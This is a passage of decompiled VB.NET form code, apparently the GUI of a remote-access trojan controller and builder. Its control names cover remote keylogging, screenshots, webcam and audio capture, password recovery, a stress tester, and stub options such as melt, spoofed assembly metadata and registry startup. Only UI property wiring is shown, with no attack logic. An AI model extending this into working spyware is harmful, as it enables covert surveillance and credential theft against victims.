            Set(ByVal value As ToolStripMenuItem)
                Dim handler As EventHandler = New EventHandler(AddressOf Me.OSToolStripMenuItem_Click)
                If (Not Me._OSToolStripMenuItem Is Nothing) Then
                    RemoveHandler Me._OSToolStripMenuItem.Click, handler
                End If
                Me._OSToolStripMenuItem = value
                If (Not Me._OSToolStripMenuItem Is Nothing) Then
                    AddHandler Me._OSToolStripMenuItem.Click, handler
                End If
            End Set
        End Property

        Friend Overridable Property PageBuilder As TabPage
            <DebuggerNonUserCode> _
            Get
                Return Me._PageBuilder
            End Get
            <MethodImpl(MethodImplOptions.Synchronized), DebuggerNonUserCode> _
            Set(ByVal value As TabPage)
                Me._PageBuilder = value
            End Set
        End Property

        Friend Overridable Property PageMain As TabPage
            <DebuggerNonUserCode> _
            Get
                Return Me._PageMain
            End Get
            <MethodImpl(MethodImplOptions.Synchronized), DebuggerNonUserCode> _
            Set(ByVal value As TabPage)
                Me._PageMain = value
            End Set
        End Property

        Friend Overridable Property PageNews As TabPage
            <DebuggerNonUserCode> _
            Get
                Return Me._PageNews
            End Get
            <MethodImpl(MethodImplOptions.Synchronized), DebuggerNonUserCode> _
            Set(ByVal value As TabPage)
                Me._PageNews = value
            End Set
        End Property

        Friend Overridable Property PageSettings As TabPage
            <DebuggerNonUserCode> _
            Get
                Return Me._PageSettings
            End Get
            <MethodImpl(MethodImplOptions.Synchronized), DebuggerNonUserCode> _
            Set(ByVal value As TabPage)
                Me._PageSettings = value
            End Set
        End Property

        Friend Overridable Property Panel1 As Panel
            <DebuggerNonUserCode> _
            Get
                Return Me._Panel1
            End Get
            <MethodImpl(MethodImplOptions.Synchronized), DebuggerNonUserCode> _
            Set(ByVal value As Panel)
                Me._Panel1 = value
            End Set
        End Property

        Friend Overridable Property Panel2 As Panel
            <DebuggerNonUserCode> _
            Get
                Return Me._Panel2
            End Get
            <MethodImpl(MethodImplOptions.Synchronized), DebuggerNonUserCode> _
            Set(ByVal value As Panel)
                Me._Panel2 = value
            End Set
        End Property

        Friend Overridable Property PasswordRecoveryToolStripMenuItem As ToolStripMenuItem
            <DebuggerNonUserCode> _
            Get
                Return Me._PasswordRecoveryToolStripMenuItem
            End Get
            <MethodImpl(MethodImplOptions.Synchronized), DebuggerNonUserCode> _
            Set(ByVal value As ToolStripMenuItem)
                Dim handler As EventHandler = New EventHandler(AddressOf Me.PasswordRecoveryToolStripMenuItem_Click)
                If (Not Me._PasswordRecoveryToolStripMenuItem Is Nothing) Then
                    RemoveHandler Me._PasswordRecoveryToolStripMenuItem.Click, handler
                End If
                Me._PasswordRecoveryToolStripMenuItem = value
                If (Not Me._PasswordRecoveryToolStripMenuItem Is Nothing) Then
                    AddHandler Me._PasswordRecoveryToolStripMenuItem.Click, handler
                End If
            End Set
        End Property

        Friend Overridable Property pb_scan As PictureBox
            <DebuggerNonUserCode> _
            Get
                Return Me._pb_scan
            End Get
            <MethodImpl(MethodImplOptions.Synchronized), DebuggerNonUserCode> _
            Set(ByVal value As PictureBox)
                Me._pb_scan = value
            End Set
        End Property

        Friend Overridable Property PictureBox_Icon As PictureBox
            <DebuggerNonUserCode> _
            Get
                Return Me._PictureBox_Icon
            End Get
            <MethodImpl(MethodImplOptions.Synchronized), DebuggerNonUserCode> _
            Set(ByVal value As PictureBox)
                Me._PictureBox_Icon = value
            End Set
        End Property

        Friend Overridable Property PictureBox1 As PictureBox
            <DebuggerNonUserCode> _
            Get
                Return Me._PictureBox1
            End Get
            <MethodImpl(MethodImplOptions.Synchronized), DebuggerNonUserCode> _
            Set(ByVal value As PictureBox)
                Me._PictureBox1 = value
            End Set
        End Property

        Friend Overridable Property PingToolStripMenuItem As ToolStripMenuItem
            <DebuggerNonUserCode> _
            Get
                Return Me._PingToolStripMenuItem
            End Get
            <MethodImpl(MethodImplOptions.Synchronized), DebuggerNonUserCode> _
            Set(ByVal value As ToolStripMenuItem)
                Me._PingToolStripMenuItem = value
            End Set
        End Property

        Friend Overridable Property priv As ColumnHeader
            <DebuggerNonUserCode> _
            Get
                Return Me._priv
            End Get
            <MethodImpl(MethodImplOptions.Synchronized), DebuggerNonUserCode> _
            Set(ByVal value As ColumnHeader)
                Me._priv = value
            End Set
        End Property

        Friend Overridable Property PrivilegsToolStripMenuItem As ToolStripMenuItem
            <DebuggerNonUserCode> _
            Get
                Return Me._PrivilegsToolStripMenuItem
            End Get
            <MethodImpl(MethodImplOptions.Synchronized), DebuggerNonUserCode> _
            Set(ByVal value As ToolStripMenuItem)
                Dim handler As EventHandler = New EventHandler(AddressOf Me.PrivilegsToolStripMenuItem_Click)
                If (Not Me._PrivilegsToolStripMenuItem Is Nothing) Then
                    RemoveHandler Me._PrivilegsToolStripMenuItem.Click, handler
                End If
                Me._PrivilegsToolStripMenuItem = value
                If (Not Me._PrivilegsToolStripMenuItem Is Nothing) Then
                    AddHandler Me._PrivilegsToolStripMenuItem.Click, handler
                End If
            End Set
        End Property

        Friend Overridable Property ProgressBar1 As FlatProgressBar
            <DebuggerNonUserCode> _
            Get
                Return Me._ProgressBar1
            End Get
            <MethodImpl(MethodImplOptions.Synchronized), DebuggerNonUserCode> _
            Set(ByVal value As FlatProgressBar)
                Me._ProgressBar1 = value
            End Set
        End Property

        Friend Overridable Property rb_appdata As RadioButton
            <DebuggerNonUserCode> _
            Get
                Return Me._rb_appdata
            End Get
            <MethodImpl(MethodImplOptions.Synchronized), DebuggerNonUserCode> _
            Set(ByVal value As RadioButton)
                Me._rb_appdata = value
            End Set
        End Property

        Friend Overridable Property rb_temp As RadioButton
            <DebuggerNonUserCode> _
            Get
                Return Me._rb_temp
            End Get
            <MethodImpl(MethodImplOptions.Synchronized), DebuggerNonUserCode> _
            Set(ByVal value As RadioButton)
                Me._rb_temp = value
            End Set
        End Property

        Friend Overridable Property RemoteKeyloggerToolStripMenuItem As ToolStripMenuItem
            <DebuggerNonUserCode> _
            Get
                Return Me._RemoteKeyloggerToolStripMenuItem
            End Get
            <MethodImpl(MethodImplOptions.Synchronized), DebuggerNonUserCode> _
            Set(ByVal value As ToolStripMenuItem)
                Dim handler As EventHandler = New EventHandler(AddressOf Me.RemoteKeyloggerToolStripMenuItem_Click)
                If (Not Me._RemoteKeyloggerToolStripMenuItem Is Nothing) Then
                    RemoveHandler Me._RemoteKeyloggerToolStripMenuItem.Click, handler
                End If
                Me._RemoteKeyloggerToolStripMenuItem = value
                If (Not Me._RemoteKeyloggerToolStripMenuItem Is Nothing) Then
                    AddHandler Me._RemoteKeyloggerToolStripMenuItem.Click, handler
                End If
            End Set
        End Property

        Friend Overridable Property RemoteScreenshotToolStripMenuItem As ToolStripMenuItem
            <DebuggerNonUserCode> _
            Get
                Return Me._RemoteScreenshotToolStripMenuItem
            End Get
            <MethodImpl(MethodImplOptions.Synchronized), DebuggerNonUserCode> _
            Set(ByVal value As ToolStripMenuItem)
                Dim handler As EventHandler = New EventHandler(AddressOf Me.RemoteScreenshotToolStripMenuItem_Click)
                If (Not Me._RemoteScreenshotToolStripMenuItem Is Nothing) Then
                    RemoveHandler Me._RemoteScreenshotToolStripMenuItem.Click, handler
                End If
                Me._RemoteScreenshotToolStripMenuItem = value
                If (Not Me._RemoteScreenshotToolStripMenuItem Is Nothing) Then
                    AddHandler Me._RemoteScreenshotToolStripMenuItem.Click, handler
                End If
            End Set
        End Property

        Friend Overridable Property RestartToolStripMenuItem1 As ToolStripMenuItem
            <DebuggerNonUserCode> _
            Get
                Return Me._RestartToolStripMenuItem1
            End Get
            <MethodImpl(MethodImplOptions.Synchronized), DebuggerNonUserCode> _
            Set(ByVal value As ToolStripMenuItem)
                Dim handler As EventHandler = New EventHandler(AddressOf Me.RestartToolStripMenuItem1_Click)
                If (Not Me._RestartToolStripMenuItem1 Is Nothing) Then
                    RemoveHandler Me._RestartToolStripMenuItem1.Click, handler
                End If
                Me._RestartToolStripMenuItem1 = value
                If (Not Me._RestartToolStripMenuItem1 Is Nothing) Then
                    AddHandler Me._RestartToolStripMenuItem1.Click, handler
                End If
            End Set
        End Property

        Friend Overridable Property rightclick As ContextMenuStrip
            <DebuggerNonUserCode> _
            Get
                Return Me._rightclick
            End Get
            <MethodImpl(MethodImplOptions.Synchronized), DebuggerNonUserCode> _
            Set(ByVal value As ContextMenuStrip)
                Me._rightclick = value
            End Set
        End Property

        Friend Overridable Property rtb_output As RichTextBox
            <DebuggerNonUserCode> _
            Get
                Return Me._rtb_output
            End Get
            <MethodImpl(MethodImplOptions.Synchronized), DebuggerNonUserCode> _
            Set(ByVal value As RichTextBox)
                Me._rtb_output = value
            End Set
        End Property

        Friend Overridable Property rtbnews As RichTextBox
            <DebuggerNonUserCode> _
            Get
                Return Me._rtbnews
            End Get
            <MethodImpl(MethodImplOptions.Synchronized), DebuggerNonUserCode> _
            Set(ByVal value As RichTextBox)
                Me._rtbnews = value
            End Set
        End Property

        Friend Overridable Property scans As ColumnHeader
            <DebuggerNonUserCode> _
            Get
                Return Me._scans
            End Get
            <MethodImpl(MethodImplOptions.Synchronized), DebuggerNonUserCode> _
            Set(ByVal value As ColumnHeader)
                Me._scans = value
            End Set
        End Property

        Friend Overridable Property server As ColumnHeader
            <DebuggerNonUserCode> _
            Get
                Return Me._server
            End Get
            <MethodImpl(MethodImplOptions.Synchronized), DebuggerNonUserCode> _
            Set(ByVal value As ColumnHeader)
                Me._server = value
            End Set
        End Property

        Friend Overridable Property ServerOptionsToolStripMenuItem As ToolStripMenuItem
            <DebuggerNonUserCode> _
            Get
                Return Me._ServerOptionsToolStripMenuItem
            End Get
            <MethodImpl(MethodImplOptions.Synchronized), DebuggerNonUserCode> _
            Set(ByVal value As ToolStripMenuItem)
                Me._ServerOptionsToolStripMenuItem = value
            End Set
        End Property

        Friend Overridable Property ShowToolStripMenuItem As ToolStripMenuItem
            <DebuggerNonUserCode> _
            Get
                Return Me._ShowToolStripMenuItem
            End Get
            <MethodImpl(MethodImplOptions.Synchronized), DebuggerNonUserCode> _
            Set(ByVal value As ToolStripMenuItem)
                Dim handler As EventHandler = New EventHandler(AddressOf Me.ShowToolStripMenuItem_Click)
                If (Not Me._ShowToolStripMenuItem Is Nothing) Then
                    RemoveHandler Me._ShowToolStripMenuItem.Click, handler
                End If
                Me._ShowToolStripMenuItem = value
                If (Not Me._ShowToolStripMenuItem Is Nothing) Then
                    AddHandler Me._ShowToolStripMenuItem.Click, handler
                End If
            End Set
        End Property

        Friend Overridable Property STRESSTesterToolStripMenuItem As ToolStripMenuItem
            <DebuggerNonUserCode> _
            Get
                Return Me._STRESSTesterToolStripMenuItem
            End Get
            <MethodImpl(MethodImplOptions.Synchronized), DebuggerNonUserCode> _
            Set(ByVal value As ToolStripMenuItem)
                Dim handler As EventHandler = New EventHandler(AddressOf Me.STRESSTesterToolStripMenuItem_Click)
                If (Not Me._STRESSTesterToolStripMenuItem Is Nothing) Then
                    RemoveHandler Me._STRESSTesterToolStripMenuItem.Click, handler
                End If
                Me._STRESSTesterToolStripMenuItem = value
                If (Not Me._STRESSTesterToolStripMenuItem Is Nothing) Then
                    AddHandler Me._STRESSTesterToolStripMenuItem.Click, handler
                End If
            End Set
        End Property

        Friend Overridable Property SurveillanceToolStripMenuItem As ToolStripMenuItem
            <DebuggerNonUserCode> _
            Get
                Return Me._SurveillanceToolStripMenuItem
            End Get
            <MethodImpl(MethodImplOptions.Synchronized), DebuggerNonUserCode> _
            Set(ByVal value As ToolStripMenuItem)
                Me._SurveillanceToolStripMenuItem = value
            End Set
        End Property

        Friend Overridable Property SystemInformationToolStripMenuItem As ToolStripMenuItem
            <DebuggerNonUserCode> _
            Get
                Return Me._SystemInformationToolStripMenuItem
            End Get
            <MethodImpl(MethodImplOptions.Synchronized), DebuggerNonUserCode> _
            Set(ByVal value As ToolStripMenuItem)
                Dim handler As EventHandler = New EventHandler(AddressOf Me.SystemInformationToolStripMenuItem_Click)
                If (Not Me._SystemInformationToolStripMenuItem Is Nothing) Then
                    RemoveHandler Me._SystemInformationToolStripMenuItem.Click, handler
                End If
                Me._SystemInformationToolStripMenuItem = value
                If (Not Me._SystemInformationToolStripMenuItem Is Nothing) Then
                    AddHandler Me._SystemInformationToolStripMenuItem.Click, handler
                End If
            End Set
        End Property

        Friend Overridable Property TabControl1 As FlatTabControl
            <DebuggerNonUserCode> _
            Get
                Return Me._TabControl1
            End Get
            <MethodImpl(MethodImplOptions.Synchronized), DebuggerNonUserCode> _
            Set(ByVal value As FlatTabControl)
                Me._TabControl1 = value
            End Set
        End Property

        Friend Overridable Property TabPage1 As TabPage
            <DebuggerNonUserCode> _
            Get
                Return Me._TabPage1
            End Get
            <MethodImpl(MethodImplOptions.Synchronized), DebuggerNonUserCode> _
            Set(ByVal value As TabPage)
                Me._TabPage1 = value
            End Set
        End Property

        Friend Overridable Property TabPage2 As TabPage
            <DebuggerNonUserCode> _
            Get
                Return Me._TabPage2
            End Get
            <MethodImpl(MethodImplOptions.Synchronized), DebuggerNonUserCode> _
            Set(ByVal value As TabPage)
                Me._TabPage2 = value
            End Set
        End Property

        Friend Overridable Property TabPage3 As TabPage
            <DebuggerNonUserCode> _
            Get
                Return Me._TabPage3
            End Get
            <MethodImpl(MethodImplOptions.Synchronized), DebuggerNonUserCode> _
            Set(ByVal value As TabPage)
                Me._TabPage3 = value
            End Set
        End Property

        Friend Overridable Property TabPage4 As TabPage
            <DebuggerNonUserCode> _
            Get
                Return Me._TabPage4
            End Get
            <MethodImpl(MethodImplOptions.Synchronized), DebuggerNonUserCode> _
            Set(ByVal value As TabPage)
                Me._TabPage4 = value
            End Set
        End Property

        Friend Overridable Property TabPage5 As TabPage
            <DebuggerNonUserCode> _
            Get
                Return Me._TabPage5
            End Get
            <MethodImpl(MethodImplOptions.Synchronized), DebuggerNonUserCode> _
            Set(ByVal value As TabPage)
                Me._TabPage5 = value
            End Set
        End Property

        Friend Overridable Property TabPage6 As TabPage
            <DebuggerNonUserCode> _
            Get
                Return Me._TabPage6
            End Get
            <MethodImpl(MethodImplOptions.Synchronized), DebuggerNonUserCode> _
            Set(ByVal value As TabPage)
                Me._TabPage6 = value
            End Set
        End Property

        Friend Overridable Property TabPage7 As TabPage
            <DebuggerNonUserCode> _
            Get
                Return Me._TabPage7
            End Get
            <MethodImpl(MethodImplOptions.Synchronized), DebuggerNonUserCode> _
            Set(ByVal value As TabPage)
                Me._TabPage7 = value
            End Set
        End Property

        Friend Overridable Property TabPage8 As TabPage
            <DebuggerNonUserCode> _
            Get
                Return Me._TabPage8
            End Get
            <MethodImpl(MethodImplOptions.Synchronized), DebuggerNonUserCode> _
            Set(ByVal value As TabPage)
                Me._TabPage8 = value
            End Set
        End Property

        Friend Overridable Property TabPage9 As TabPage
            <DebuggerNonUserCode> _
            Get
                Return Me._TabPage9
            End Get
            <MethodImpl(MethodImplOptions.Synchronized), DebuggerNonUserCode> _
            Set(ByVal value As TabPage)
                Me._TabPage9 = value
            End Set
        End Property

        Friend Overridable Property tb_assemblycompany As FlatTextBox
            <DebuggerNonUserCode> _
            Get
                Return Me._tb_assemblycompany
            End Get
            <MethodImpl(MethodImplOptions.Synchronized), DebuggerNonUserCode> _
            Set(ByVal value As FlatTextBox)
                Me._tb_assemblycompany = value
            End Set
        End Property

        Friend Overridable Property tb_assemblycopyright As FlatTextBox
            <DebuggerNonUserCode> _
            Get
                Return Me._tb_assemblycopyright
            End Get
            <MethodImpl(MethodImplOptions.Synchronized), DebuggerNonUserCode> _
            Set(ByVal value As FlatTextBox)
                Me._tb_assemblycopyright = value
            End Set
        End Property

        Friend Overridable Property tb_assemblydescription As FlatTextBox
            <DebuggerNonUserCode> _
            Get
                Return Me._tb_assemblydescription
            End Get
            <MethodImpl(MethodImplOptions.Synchronized), DebuggerNonUserCode> _
            Set(ByVal value As FlatTextBox)
                Me._tb_assemblydescription = value
            End Set
        End Property

        Friend Overridable Property tb_assemblyfileversion As FlatTextBox
            <DebuggerNonUserCode> _
            Get
                Return Me._tb_assemblyfileversion
            End Get
            <MethodImpl(MethodImplOptions.Synchronized), DebuggerNonUserCode> _
            Set(ByVal value As FlatTextBox)
                Me._tb_assemblyfileversion = value
            End Set
        End Property

        Friend Overridable Property tb_assemblyproduct As FlatTextBox
            <DebuggerNonUserCode> _
            Get
                Return Me._tb_assemblyproduct
            End Get
            <MethodImpl(MethodImplOptions.Synchronized), DebuggerNonUserCode> _
            Set(ByVal value As FlatTextBox)
                Me._tb_assemblyproduct = value
            End Set
        End Property

        Friend Overridable Property tb_assemblytitle As FlatTextBox
            <DebuggerNonUserCode> _
            Get
                Return Me._tb_assemblytitle
            End Get
            <MethodImpl(MethodImplOptions.Synchronized), DebuggerNonUserCode> _
            Set(ByVal value As FlatTextBox)
                Me._tb_assemblytitle = value
            End Set
        End Property

        Friend Overridable Property tb_assemblytrademark As FlatTextBox
            <DebuggerNonUserCode> _
            Get
                Return Me._tb_assemblytrademark
            End Get
            <MethodImpl(MethodImplOptions.Synchronized), DebuggerNonUserCode> _
            Set(ByVal value As FlatTextBox)
                Me._tb_assemblytrademark = value
            End Set
        End Property

        Friend Overridable Property tb_assemblyversion As FlatTextBox
            <DebuggerNonUserCode> _
            Get
                Return Me._tb_assemblyversion
            End Get
            <MethodImpl(MethodImplOptions.Synchronized), DebuggerNonUserCode> _
            Set(ByVal value As FlatTextBox)
                Me._tb_assemblyversion = value
            End Set
        End Property

        Friend Overridable Property tb_host As FlatComboBox
            <DebuggerNonUserCode> _
            Get
                Return Me._tb_host
            End Get
            <MethodImpl(MethodImplOptions.Synchronized), DebuggerNonUserCode> _
            Set(ByVal value As FlatComboBox)
                Dim handler As EventHandler = New EventHandler(AddressOf Me.tb_host_DropDown)
                Dim handler2 As EventHandler = New EventHandler(AddressOf Me.tb_host_Click)
                If (Not Me._tb_host Is Nothing) Then
                    RemoveHandler Me._tb_host.DropDown, handler
                    RemoveHandler Me._tb_host.Click, handler2
                End If
                Me._tb_host = value
                If (Not Me._tb_host Is Nothing) Then
                    AddHandler Me._tb_host.DropDown, handler
                    AddHandler Me._tb_host.Click, handler2
                End If
            End Set
        End Property

        Friend Overridable Property tb_install_path As FlatTextBox
            <DebuggerNonUserCode> _
            Get
                Return Me._tb_install_path
            End Get
            <MethodImpl(MethodImplOptions.Synchronized), DebuggerNonUserCode> _
            Set(ByVal value As FlatTextBox)
                Dim handler As EventHandler = New EventHandler(AddressOf Me.tb_install_path_Click)
                If (Not Me._tb_install_path Is Nothing) Then
                    RemoveHandler Me._tb_install_path.Click, handler
                End If
                Me._tb_install_path = value
                If (Not Me._tb_install_path Is Nothing) Then
                    AddHandler Me._tb_install_path.Click, handler
                End If
            End Set
        End Property

        Friend Overridable Property tb_runfile As FlatTextBox
            <DebuggerNonUserCode> _
            Get
                Return Me._tb_runfile
            End Get
            <MethodImpl(MethodImplOptions.Synchronized), DebuggerNonUserCode> _
            Set(ByVal value As FlatTextBox)
                Dim handler As EventHandler = New EventHandler(AddressOf Me.tb_runfile_TextChanged)
                If (Not Me._tb_runfile Is Nothing) Then
                    RemoveHandler Me._tb_runfile.TextChanged, handler
                End If
                Me._tb_runfile = value
                If (Not Me._tb_runfile Is Nothing) Then
                    AddHandler Me._tb_runfile.TextChanged, handler
                End If
            End Set
        End Property

        Friend Overridable Property tb_web As FlatTextBox
            <DebuggerNonUserCode> _
            Get
                Return Me._tb_web
            End Get
            <MethodImpl(MethodImplOptions.Synchronized), DebuggerNonUserCode> _
            Set(ByVal value As FlatTextBox)
                Dim handler As EventHandler = New EventHandler(AddressOf Me.tb_web_TextChanged)
                If (Not Me._tb_web Is Nothing) Then
                    RemoveHandler Me._tb_web.TextChanged, handler
                End If
                Me._tb_web = value
                If (Not Me._tb_web Is Nothing) Then
                    AddHandler Me._tb_web.TextChanged, handler
                End If
            End Set
        End Property

        Friend Overridable Property time As ColumnHeader
            <DebuggerNonUserCode> _
            Get
                Return Me._time
            End Get
            <MethodImpl(MethodImplOptions.Synchronized), DebuggerNonUserCode> _
            Set(ByVal value As ColumnHeader)
                Me._time = value
            End Set
        End Property

        Friend Overridable Property title As ColumnHeader
            <DebuggerNonUserCode> _
            Get
                Return Me._title
            End Get
            <MethodImpl(MethodImplOptions.Synchronized), DebuggerNonUserCode> _
            Set(ByVal value As ColumnHeader)
                Me._title = value
            End Set
        End Property

        Friend Overridable Property toggledownload As FlatToggle
            <DebuggerNonUserCode> _
            Get
                Return Me._toggledownload
            End Get
            <MethodImpl(MethodImplOptions.Synchronized), DebuggerNonUserCode> _
            Set(ByVal value As FlatToggle)
                Dim handler As CheckedChangedEventHandler = New CheckedChangedEventHandler(AddressOf Me.rd_runfile_CheckedChanged)
                If (Not Me._toggledownload Is Nothing) Then
                    RemoveHandler Me._toggledownload.CheckedChanged, handler
                End If
                Me._toggledownload = value
                If (Not Me._toggledownload Is Nothing) Then
                    AddHandler Me._toggledownload.CheckedChanged, handler
                End If
            End Set
        End Property

        Friend Overridable Property toggleweb As FlatToggle
            <DebuggerNonUserCode> _
            Get
                Return Me._toggleweb
            End Get
            <MethodImpl(MethodImplOptions.Synchronized), DebuggerNonUserCode> _
            Set(ByVal value As FlatToggle)
                Dim handler As CheckedChangedEventHandler = New CheckedChangedEventHandler(AddressOf Me.toggleweb_CheckedChanged)
                If (Not Me._toggleweb Is Nothing) Then
                    RemoveHandler Me._toggleweb.CheckedChanged, handler
                End If
                Me._toggleweb = value
                If (Not Me._toggleweb Is Nothing) Then
                    AddHandler Me._toggleweb.CheckedChanged, handler
                End If
            End Set
        End Property

        Friend Overridable Property ToolStripMenuItem1 As ToolStripMenuItem
            <DebuggerNonUserCode> _
            Get
                Return Me._ToolStripMenuItem1
            End Get
            <MethodImpl(MethodImplOptions.Synchronized), DebuggerNonUserCode> _
            Set(ByVal value As ToolStripMenuItem)
                Dim handler As EventHandler = New EventHandler(AddressOf Me.ToolStripMenuItem1_Click)
                If (Not Me._ToolStripMenuItem1 Is Nothing) Then
                    RemoveHandler Me._ToolStripMenuItem1.Click, handler
                End If
                Me._ToolStripMenuItem1 = value
                If (Not Me._ToolStripMenuItem1 Is Nothing) Then
                    AddHandler Me._ToolStripMenuItem1.Click, handler
                End If
            End Set
        End Property

        Friend Overridable Property UninstallToolStripMenuItem As ToolStripMenuItem
            <DebuggerNonUserCode> _
            Get
                Return Me._UninstallToolStripMenuItem
            End Get
            <MethodImpl(MethodImplOptions.Synchronized), DebuggerNonUserCode> _
            Set(ByVal value As ToolStripMenuItem)
                Dim handler As EventHandler = New EventHandler(AddressOf Me.UninstallToolStripMenuItem_Click)
                If (Not Me._UninstallToolStripMenuItem Is Nothing) Then
                    RemoveHandler Me._UninstallToolStripMenuItem.Click, handler
                End If
                Me._UninstallToolStripMenuItem = value
                If (Not Me._UninstallToolStripMenuItem Is Nothing) Then
                    AddHandler Me._UninstallToolStripMenuItem.Click, handler
                End If
            End Set
        End Property

        Friend Overridable Property updateserver As Timer
            <DebuggerNonUserCode> _
            Get
                Return Me._updateserver
            End Get
            <MethodImpl(MethodImplOptions.Synchronized), DebuggerNonUserCode> _
            Set(ByVal value As Timer)
                Dim handler As EventHandler = New EventHandler(AddressOf Me.updateserver_Tick)
                If (Not Me._updateserver Is Nothing) Then
                    RemoveHandler Me._updateserver.Tick, handler
                End If
                Me._updateserver = value
                If (Not Me._updateserver Is Nothing) Then
                    AddHandler Me._updateserver.Tick, handler
                End If
            End Set
        End Property

        Friend Overridable Property UpdateServerToolStripMenuItem As ToolStripMenuItem
            <DebuggerNonUserCode> _
            Get
                Return Me._UpdateServerToolStripMenuItem
            End Get
            <MethodImpl(MethodImplOptions.Synchronized), DebuggerNonUserCode> _
            Set(ByVal value As ToolStripMenuItem)
                Me._UpdateServerToolStripMenuItem = value
            End Set
        End Property

        Friend Overridable Property user As ColumnHeader
            <DebuggerNonUserCode> _
            Get
                Return Me._user
            End Get
            <MethodImpl(MethodImplOptions.Synchronized), DebuggerNonUserCode> _
            Set(ByVal value As ColumnHeader)
                Me._user = value
            End Set
        End Property

        Friend Overridable Property ver As ColumnHeader
            <DebuggerNonUserCode> _
            Get
                Return Me._ver
            End Get
            <MethodImpl(MethodImplOptions.Synchronized), DebuggerNonUserCode> _
            Set(ByVal value As ColumnHeader)
                Me._ver = value
            End Set
        End Property

        Friend Overridable Property WebcamToolStripMenuItem As ToolStripMenuItem
            <DebuggerNonUserCode> _
            Get
                Return Me._WebcamToolStripMenuItem
            End Get
            <MethodImpl(MethodImplOptions.Synchronized), DebuggerNonUserCode> _
            Set(ByVal value As ToolStripMenuItem)
                Dim handler As EventHandler = New EventHandler(AddressOf Me.WebcamToolStripMenuItem_Click)
                If (Not Me._WebcamToolStripMenuItem Is Nothing) Then
                    RemoveHandler Me._WebcamToolStripMenuItem.Click, handler
                End If
                Me._WebcamToolStripMenuItem = value
                If (Not Me._WebcamToolStripMenuItem Is Nothing) Then
                    AddHandler Me._WebcamToolStripMenuItem.Click, handler
                End If
            End Set
        End Property


        ' Fields
        Private Shared __ENCList As List(Of WeakReference) = New List(Of WeakReference)
        <AccessedThroughProperty("AddNewToolStripMenuItem")> _
        Private _AddNewToolStripMenuItem As ToolStripMenuItem
        <AccessedThroughProperty("AudioCaptureToolStripMenuItem")> _
        Private _AudioCaptureToolStripMenuItem As ToolStripMenuItem
        <AccessedThroughProperty("avs")> _
        Private _avs As ColumnHeader
        <AccessedThroughProperty("boxhosts")> _
        Private _boxhosts As FlatListBox
        <AccessedThroughProperty("btn_build")> _
        Private _btn_build As FlatButton
        <AccessedThroughProperty("btn_generate")> _
        Private _btn_generate As FlatButton
        <AccessedThroughProperty("btn_load_settings")> _
        Private _btn_load_settings As FlatButton
        <AccessedThroughProperty("btn_selecticn")> _
        Private _btn_selecticn As FlatStickyButton
        <AccessedThroughProperty("cb_ac")> _
        Private _cb_ac As FlatCheckBox
        <AccessedThroughProperty("cb_hkcu")> _
        Private _cb_hkcu As RadioButton
        <AccessedThroughProperty("cb_hklm")> _
        Private _cb_hklm As RadioButton
        <AccessedThroughProperty("cb_icon")> _
        Private _cb_icon As FlatCheckBox
        <AccessedThroughProperty("cb_install")> _
        Private _cb_install As FlatCheckBox
        <AccessedThroughProperty("cb_install_enable")> _
        Private _cb_install_enable As FlatCheckBox
        <AccessedThroughProperty("cb_melt")> _
        Private _cb_melt As FlatCheckBox
        <AccessedThroughProperty("cb_notify")> _
        Private _cb_notify As FlatCheckBox
        <AccessedThroughProperty("cb_savesettings")> _
        Private _cb_savesettings As FlatCheckBox
        <AccessedThroughProperty("cb_sc")> _
        Private _cb_sc As FlatCheckBox
        <AccessedThroughProperty("cb_sound")> _
        Private _cb_sound As FlatCheckBox
        <AccessedThroughProperty("CloseButton")> _
        Private _CloseButton As FlatClose
        <AccessedThroughProperty("ColumnHeader1")> _
        Private _ColumnHeader1 As ColumnHeader
        <AccessedThroughProperty("ColumnHeader2")> _
        Private _ColumnHeader2 As ColumnHeader
        <AccessedThroughProperty("ColumnHeader3")> _
        Private _ColumnHeader3 As ColumnHeader
        <AccessedThroughProperty("ColumnHeader4")> _
        Private _ColumnHeader4 As ColumnHeader
        <AccessedThroughProperty("ColumnHeader5")> _
        Private _ColumnHeader5 As ColumnHeader
        <AccessedThroughProperty("ColumnHeader6")> _
        Private _ColumnHeader6 As ColumnHeader
        <AccessedThroughProperty("ColumnHeader7")> _
        Private _ColumnHeader7 As ColumnHeader
        <AccessedThroughProperty("ConnectionToolStripMenuItem")> _
        Private _ConnectionToolStripMenuItem As ToolStripMenuItem
        <AccessedThroughProperty("ConnectToAllToolStripMenuItem")> _
        Private _ConnectToAllToolStripMenuItem As ToolStripMenuItem
        <AccessedThroughProperty("ConnectToolStripMenuItem")> _
        Private _ConnectToolStripMenuItem As ToolStripMenuItem
        <AccessedThroughProperty("ContextDeleteHosts")> _
        Private _ContextDeleteHosts As ContextMenuStrip
        <AccessedThroughProperty("countryflags")> _
        Private _countryflags As ImageList
        <AccessedThroughProperty("CountryToolStripMenuItem")> _
        Private _CountryToolStripMenuItem As ToolStripMenuItem
        <AccessedThroughProperty("DeleteToolStripMenuItem")> _
        Private _DeleteToolStripMenuItem As ToolStripMenuItem
        <AccessedThroughProperty("DisconnectToolStripMenuItem")> _
        Private _DisconnectToolStripMenuItem As ToolStripMenuItem
        <AccessedThroughProperty("DotNetBarTabcontrol1")> _
        Private _DotNetBarTabcontrol1 As DotNetBarTabcontrol
        <AccessedThroughProperty("DotNetBarTabcontrol2")> _
        Private _DotNetBarTabcontrol2 As DotNetBarTabcontrol
        <AccessedThroughProperty("ExecuteFileToolStripMenuItem")> _
        Private _ExecuteFileToolStripMenuItem As ToolStripMenuItem
        <AccessedThroughProperty("ExitToolStripMenuItem")> _
        Private _ExitToolStripMenuItem As ToolStripMenuItem
        <AccessedThroughProperty("FlatGroupBox1")> _
        Private _FlatGroupBox1 As FlatGroupBox
        <AccessedThroughProperty("FlatGroupBox10")> _
        Private _FlatGroupBox10 As FlatGroupBox
        <AccessedThroughProperty("FlatGroupBox11")> _
        Private _FlatGroupBox11 As FlatGroupBox
        <AccessedThroughProperty("FlatGroupBox2")> _
        Private _FlatGroupBox2 As FlatGroupBox
        <AccessedThroughProperty("FlatGroupBox3")> _
        Private _FlatGroupBox3 As FlatGroupBox
        <AccessedThroughProperty("FlatGroupBox4")> _
        Private _FlatGroupBox4 As FlatGroupBox
        <AccessedThroughProperty("FlatGroupBox5")> _
        Private _FlatGroupBox5 As FlatGroupBox
        <AccessedThroughProperty("FlatGroupBox6")> _
        Private _FlatGroupBox6 As FlatGroupBox
        <AccessedThroughProperty("FlatGroupBox7")> _
        Private _FlatGroupBox7 As FlatGroupBox
        <AccessedThroughProperty("FlatGroupBox8")> _
        Private _FlatGroupBox8 As FlatGroupBox
